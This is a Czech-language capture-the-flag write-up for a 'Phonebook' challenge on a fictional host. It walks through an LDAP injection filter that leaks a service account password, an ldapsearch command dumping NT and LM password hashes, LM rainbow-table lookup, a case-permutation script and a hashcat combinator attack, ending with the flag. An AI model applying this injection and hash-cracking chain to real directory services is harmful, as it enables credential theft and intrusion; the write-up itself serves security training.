# Phonebook

## Zadání

```
Hi, packet inspector,

you should already get access to the phone book – as a new employee – but the AI is too busy right now. This condition can last several ... who knows ... years?

Your task is to gain access to the application running on http://phonebook.mysterious-delivery.tcc:40000.

May the Packet be with you!
```

## Řešení

### 1. LDAP

Ve zdrojovém kódu lze nalézt komentář:

```
<!-- New LDAP server host: 10.99.0.121 -->
<!-- 1/2/2022 Temporary search filter (|(&(memberof=cn=users,ou=groups,dc=local,dc=tcc)(uid=_DATA_))(memberof=cn=nonmigrated,ou=groups,dc=local,dc=tcc)) -->
<!-- 6/8/2022 Filter after migration  (|(&(memberof=cn=users,ou=groups,dc=local,dc=tcc)(uid=_DATA_}))) -->
```

Nejspíš se jedná o LDAP injection!
Filter ```*)(uid=*))(|(uid=*``` nám odhalí jednoho uživatele s heslem v description:
```
ldap_sync	Don't change password. gasg35faCasgt%AF
```

Pomocí tohoto účtu můžeme vypsat hashe všech LDAP uživatelů:
```
ldapsearch -x -b "dc=local,dc=tcc" -D "uid=ldap_sync,ou=people,dc=local,dc=tcc" -w "gasg35faCasgt%AF" -H ldap://10.99.0.121
```

```
...
# admin2, people, local.tcc
dn: uid=admin2,ou=people,dc=local,dc=tcc
objectClass: inetOrgPerson
objectClass: sambaSamAccount
cn: admin2
givenName: admin
sn: admin2
homePhone: 5452487532
mail: admin2@local.tcc
sambaSID: S-1-5-21-1528920847-3529959213-2887712062
sambaNTPassword: 32644235283BC5561CC7FE4FFFADDAEE
sambaLMPassword: 48448F207404DB05F3BAC3A9216F6D52
uid: admin2
description: Admin account
```

### 2. Cracknutí hesla

Nás zajimá uživatel `admin2`, prostřednictvím kterého se budeme moci přihlásit na webu a získat vlajku.
LM hash můžeme získat pomocí rainbow tables například na stránce http://rainbowtables.it64.com/

```
48448f207404db05 TOOSTRO 
f3bac3a9216f6d52 NGPASS. 
```

Víme tedy, že heslo začíná `TOOSTRONGPASS.` - pokud chceme znát heslo včetně velikosti písmen musíme použít i NT hash, který už takto jednoduše prolomit nelze. Dále může být heslo delší než 14 znaků, protože LM hash ukladá pouze prvních 14 znaků.

Vygenerování slovníku s různou velikostí písmen:

```python
PW = 'TOOSTRONGPASS'

def brute(p = ''):
    i = len(p)
    if i == len(PW):
        print(p + '.')
    else:
        brute(p + PW[i:i+1].lower())
        brute(p + PW[i:i+1])

brute()
```

Cracknutí NT hashe v hashcat (`pwd.txt` je slovník s různou velikostí `TOOSTRONGPASS.`, známý slovník `rockyou.txt` se použije pro kombinaci:
```
hashcat -m 1000 -a 1 hash.txt pwd.txt rockyou.txt

32644235283bc5561cc7fe4fffaddaee:TooStrongPass.2022
```

Přihlásíme se na stránce jako `admin2` + heslo `TooStrongPass.2022`.

## Vlajka

```
FLAG{iLcT-HnNF-egs3-mCSN}
```